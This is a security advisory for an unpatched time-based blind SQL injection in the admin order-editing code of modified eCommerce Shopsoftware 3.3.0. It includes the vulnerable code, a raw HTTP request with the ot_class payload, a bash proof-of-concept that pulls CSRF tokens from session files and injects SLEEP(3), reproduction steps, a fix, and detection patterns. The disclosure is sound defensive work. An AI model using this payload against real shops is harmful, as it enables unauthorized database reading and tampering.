# Security Advisory: SQL Injection (Time-Based Blind) in admin/orders_edit.php via ot_class

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** High
> **CVSS:** 7.2 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a time-based blind SQL injection in `admin/orders_edit.php` via the `ot_class` POST parameter. The function `orders_ot_edit()` in `admin/includes/functions/orders_functions.php` interpolates `$_POST['ot_class']` directly into a SQL WHERE clause without sanitization. An authenticated administrator exploiting this vulnerability can read or modify any database content.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/orders_edit.php | rev 16825 | None | Affected |
| Component: admin/includes/functions/orders_functions.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

When an admin edits order totals (`action=ot_edit`), the value of `$_POST['ot_class']` is passed to `orders_ot_edit()` as `$data_array['ot_class']`. Inside that function, the value is embedded in a SQL SELECT query's WHERE clause without any escaping. The parameter is not in the `Inputfilter` whitelist, so it passes through without validation.

**Root cause:**

```php
// admin/includes/functions/orders_functions.php:1107–1110
function orders_ot_edit($oID, $data_array) {
    global $messageStack, $xtPrice;
    $check_total_query = xtc_db_query("SELECT orders_total_id
                                         FROM ".TABLE_ORDERS_TOTAL."
                                        WHERE orders_id = '".(int)$oID."'
                                          AND class = '".$data_array['ot_class']."'");
    // ↑ $data_array['ot_class'] = $_POST['ot_class'] — no xtc_db_input() applied
}

// admin/orders_edit.php:141
orders_ot_edit($_POST['oID'], $_POST);
```

### Necessary Conditions

- **Authentication:** Admin
- **User interaction:** None
- **Attack vector:** Network
- **Preconditions:** Valid admin session, CSRF token, existing order with `orders_total` entries

---

## 4. Impact

- **Confidentiality:** High — full DB read via time-based blind extraction
- **Integrity:** High — subquery-based data manipulation
- **Availability:** High — resource exhaustion via SLEEP/BENCHMARK

---

## 5. Classification

### CVSS

- **Score:** 7.2
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | High |

### CWE

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command

### CAPEC

- CAPEC-7: Blind SQL Injection

---

## 6. Exploitation Scenario

1. Attacker authenticates as admin and identifies an existing order ID (e.g., oID=1).
2. Attacker obtains CSRF token from the orders_edit page.
3. Attacker sends POST to `orders_edit.php?action=ot_edit` with `ot_class=ot_subtotal' AND SLEEP(3)-- -` and valid supporting fields (`ot_title`, `ot_value`, `ot_sort_order`).
4. The injected fragment breaks out of the SQL string and appends `AND SLEEP(3)`.
5. Attacker uses binary-search SLEEP conditions to extract DB version, user, table names, and data.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/includes/functions/orders_functions.php (line 1110)
         admin/orders_edit.php (line 141)
Parameter(s): ot_class (POST)
Method: POST · Authentication: Admin required
```

### Example Request

```http
POST /admin/orders_edit.php?action=ot_edit HTTP/1.1
Host: TARGET
Cookie: MODsid=<SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<CSRF_NAME>=<CSRF_VALUE>&oID=1&ot_title=Test&ot_value=10&ot_sort_order=10
&ot_class=ot_subtotal'+AND+SLEEP(3)--+-
```

### Observed Response

```text
HTTP/1.1 200 OK
[Response time: ~3027ms]
```

### Result

Confirmed in authorized Docker lab with order ID=1. SLEEP(3) produces 3027ms response. Non-destructive.

**Evidence:** 3027ms vs <80ms baseline on same endpoint.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V04 PoC — SQLi Time-Based Blind in orders_edit.php via ot_class
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Obtain CSRF token from orders_edit page (requires existing order)
PAGE=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "$TARGET/admin/orders_edit.php?oID=1&edit_action=other")
CSRF_NAME=$(docker exec modifiedshop_web bash -c \
  "cat /tmp/sess_${SID} | tr ';' '\n' | grep CSRFName" | grep -oP 's:\d+:"\K[^"]+')
CSRF_VALUE=$(docker exec modifiedshop_web bash -c \
  "cat /tmp/sess_${SID} | tr ';' '\n' | grep CSRFToken" | grep -oP 's:\d+:"\K[^"]+')

# Step 2: Inject SLEEP(3) via ot_class
START=$(date +%s%3N)
HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/orders_edit.php?action=ot_edit" \
  -d "${CSRF_NAME}=${CSRF_VALUE}&oID=1&ot_title=Test&ot_value=10&ot_sort_order=10" \
  --data-urlencode "ot_class=ot_subtotal' AND SLEEP(3)-- -")
END=$(date +%s%3N)
echo "HTTP: $HTTP | Elapsed: $((END-START))ms"
# Expected: HTTP: 200 | Elapsed: ~3027ms
```

### Expected Result

```text
HTTP: 200 | Elapsed: ~3027ms
```

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove third-party data.
- Does not create persistence or backdoors.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Deploy authorized instance. Create a test order (or use existing).
2. Log in as admin. Navigate to `orders_edit.php?oID=<id>&edit_action=other`.
3. Read CSRF token from session file or page source.
4. POST with payload `ot_class=ot_subtotal' AND SLEEP(3)-- -`.
5. Confirm ≥3 second response delay.

---

## 10. Mitigation

- Wrap `$data_array['ot_class']` in `xtc_db_input()` in `orders_ot_edit()`.
- Alternatively, validate `ot_class` against an explicit whitelist of known order total classes.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// Vulnerable (orders_functions.php:1110):
AND class = '".$data_array['ot_class']."'

// Fixed — whitelist approach:
$allowed_classes = ['ot_subtotal', 'ot_shipping', 'ot_tax', 'ot_total', 'ot_coupon'];
if (!in_array($data_array['ot_class'], $allowed_classes, true)) {
    return false;
}
// ... then use in query

// Or minimal fix:
AND class = '".xtc_db_input($data_array['ot_class'])."'
```

---

## 12. Detection and Indicators

- POST to `/admin/orders_edit.php?action=ot_edit` with response > 2 seconds.
- `ot_class` values containing `'`, `--`, `SLEEP`, `UNION`.

### Example Log Search

```text
grep "orders_edit.php.*ot_edit" access.log | awk '$NF > 2000'
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021-blip/Advisory
